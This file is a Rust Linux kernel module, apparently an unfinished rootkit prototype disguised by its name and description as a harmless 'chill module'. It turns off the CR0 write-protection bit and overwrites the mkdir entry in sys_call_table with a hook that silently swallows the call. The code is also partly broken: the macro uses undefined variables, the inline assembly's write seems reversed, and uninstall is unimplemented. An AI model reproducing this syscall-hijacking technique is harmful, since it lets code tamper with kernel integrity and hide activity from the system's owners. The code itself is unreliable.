//! Innocent Rusty module
#![allow(unused)]
#![no_std]

use core::ffi::{c_char, c_long, c_void};
use core::format_args;
use kernel::asm;
use kernel::bindings::{
    __NR_mkdir, __NR_read, __NR_syscalls, ftrace_ops, kallsyms_lookup_name, pt_regs,
};
use kernel::error::Result;
use kernel::prelude::*;
use kernel::tracepoint;

module! {
    type: IRM,
    name: "irm",
    author: "Began Bajrami",
    description: "just a chill module",
    license: "GPL",
}

macro_rules! hook {
    ($name:expr, $hook_ptr:expr, $orig_ptr:expr) => {
        Hook {
            name: $name,
            function: $hook,
            original: $orig,
        }
    };
}

struct Hook<'a> {
    name: &'a str,
    nr: u32,
    hook: &'a SyscallT, 
    ptr: *const (), 
    original: &'a Syscall,
}

struct Syscall {
    fun: SyscallT,
    ptr: *mut usize,
}

type SyscallT = unsafe extern "C" fn(pt_regs) -> c_long;

unsafe extern "C" fn hook_mkdir(regs: *const pt_regs) -> c_long {
    pr_info!("jeager");
    unsafe {
        let pathn = (*regs).di as *const i8;
        let mut dir_name = 0 as core::ffi::c_char;
        let res = kernel::bindings::strncpy_from_user(&mut dir_name, pathn, 255 as core::ffi::c_long);
        pr_info!("chilling: {}", res);
    }
    0
}

struct IRM;
impl kernel::Module for IRM {
    fn init(_module: &'static ThisModule) -> Result<Self> {
        pr_info!("hey bud, wassup");

        let __sys_call_table: Syscall = get_addr_ptr(b"sys_call_table\0").expect("invalid symbol name");
        let __mkdir_ptr_orig: Syscall = get_addr_ptr(b"__x64_sys_mkdir\0").expect("invalid symbol name");
        let __mkdir_ptr_hook: Hook<'_>;
        unsafe {
            __mkdir_ptr_hook = Hook {
                name: "__x64_sys_mkdir",
                nr: __NR_mkdir,
                ptr: hook_mkdir as *const (),
                original: &__mkdir_ptr_orig,
                hook: core::mem::transmute(hook_mkdir as *mut c_void),
            };
        }

        pr_info!("__sys_call_table | ptr:{:p}", __sys_call_table.ptr);
        pr_info!("__mkdir_ptr_orig | ptr:{:p}", __mkdir_ptr_orig.ptr);
        pr_info!("__mkdir_ptr_hook | ptr:{:p}", __mkdir_ptr_hook.hook);

        install_hook(&__sys_call_table, &__mkdir_ptr_hook);

        Ok(IRM)
    }
}


fn get_addr_ptr(symb: &[u8]) -> Option<Syscall> {
    let cstr = CStr::from_bytes_with_nul(symb).ok()?;
    unsafe {
        // WARNING: this only works if kallasyms_lookup_name is exported in the kernel,
        // which means that this WILL NOT work on any linux above 5.7 (i.e.
        // it wont effectively work on any linux distribution that supports rust)
        // Some work must be done here to try and get the symbol address without using
        // kallsyms_lookup_name. alternatives would include using kprobes.
        //
        // For demonstration purposes, kallsyms_lookup_name will be used instead.
        // To export kallsyms_lookup_name, add "EXPORT_SYMBOL(kallsyms_lookup_name)" in
        // "kernel/kallsyms.c" and compile kernel
        let symbaddr = kallsyms_lookup_name(cstr.as_char_ptr());
        if symbaddr == 0 {
            None
        } else {
            Some(Syscall{
                fun: core::mem::transmute(symbaddr),
                ptr: core::mem::transmute(symbaddr),
            })
        }
    }
}

// I had to implement this since read_cr0 is not exported in bindings
// CR0 is a special x86_64 register that holds some flags, like the 16th bit
// which makes writing to syscall_table protected (Write Protection is a memory protection)
fn cr0_read() -> u64 {
    let mut cr0: u64;
    unsafe {
        core::arch::asm!(
            "mov {0}, cr0",
            out(reg) cr0,  //options(nostack, preserves_flags)
        );
    }
    cr0
}

fn unshield_memory() {
    let mut cr0 = cr0_read();
    // pr_info!("CR0 value before {:b}", cr0);
    cr0 &= !(1 << 16);      // Clear the write-protection bit
    unsafe {
        core::arch::asm!(
            "mov cr0, {}",
            in(reg) cr0, 
        );
    }
    cr0 = cr0_read(); // call cr0_read again
    // pr_info!("CR0 value after {:b}", cr0);
}

fn shield_memory() {
    let mut cr0 = cr0_read();
    // pr_info!("CR0 value before {:b}", cr0);
    cr0 |= 1 << 16; // Set the write-protection bit
    unsafe {
        core::arch::asm!(
            "mov cr0, {}",
            in(reg) cr0, 
        );
    }
    cr0 = cr0_read();
    // pr_info!("CR0 value after {:b}", cr0);
}

fn install_hook(systab: &Syscall, hook: &Hook<'_>) {
    unsafe {
        //let systab = IRM::get_addr_ptr(b"sys_call_table\0").expect("symbol not correct") ;
        // pr_info!(
        //     "sys_call_table address {:p}",
        //     systab as *const core::ffi::c_void
        // );
        // pr_info!(
        //     "sys_call_table[__nr_mkdir] address{:p}",
        //     orig_entry as *const core::ffi::c_void
        // );
        //

        // pr_info!("++++++++++++++++++++++++++++");
        // pr_info!("syscalls: {}", __NR_syscalls);
        // pr_info!("mkdir: {}", __NR_mkdir);
        // pr_info!("\t|\t\tpointer\t\t\t|\t\tpointed function\t\t|");
        // for i in 0..__NR_syscalls {
        //     let pointer = systab.add(i as usize).read_volatile() as *mut core::ffi::c_void;
        //     pr_info!("\t{}|\t{:p}\t\t|\t\t{:p}\t\t|", i, systab.add(i.try_into().unwrap()) , pointer);
        // }
        // pr_info!("++++++++++++++++++++++++++++");
        // pr_info!("making a call to read");
        //
        // let sys_read_fn: extern "C" fn(regs: *mut pt_regs) -> isize = unsafe { core::mem::transmute(systab.add(__NR_read as usize)) };
        // let mut regs = pt_regs{
        //     di: 0,
        //     si: 0 as u64,
        //     dx: 0,
        //     ..Default::default()
        // };
        // let res = unsafe{ sys_read_fn(&mut regs)};
        // pr_info!("result: {}", res);

        // IRM::write_to_nr(&mut systab, __NR_mkdir.try_into().unwrap(), hook_mkdir as *mut core::ffi::c_void);


        //let pointer = systab.add(__NR_mkdir as usize).read_volatile() as *mut core::ffi::c_void;
        // pr_info!(
        //     "\t{}|\t{:p}\t\t|\t\t{:p}\t\t|",
        //     __NR_mkdir,
        //     systab.add(__NR_mkdir as usize),
        //     pointer
        // );

        unshield_memory();

        let ptr = (systab.ptr).add(hook.nr as usize);
        let hptr = hook.ptr;
        pr_info!("{:p} - {:#x}", ptr, ptr.read_volatile());
        pr_info!("{:p}", hptr);
        // sysptr.add(hook.nr as usize).write_volatile(core::mem::transmute(hook.ptr));
         
        core::arch::asm!(
            "mov rax, {0}",
            "mov rbx, {1}",
            "mov [rbx], rax",
            in(reg) ptr,                    // Value to write
            in(reg) hptr,                   // Target address
        );

        pr_info!("{:p} - {:#x}", ptr, ptr.read_volatile());

        shield_memory();

        pr_info!("{:p} - {:#x}", ptr, ptr.read_volatile());
    }
}

fn uninstall_hook() {
    todo!();
}

impl Drop for IRM {
    fn drop(&mut self) {
        pr_info!("Why? Nobody likes me, I'm an Innocent chill module ;( \n");
    }
}
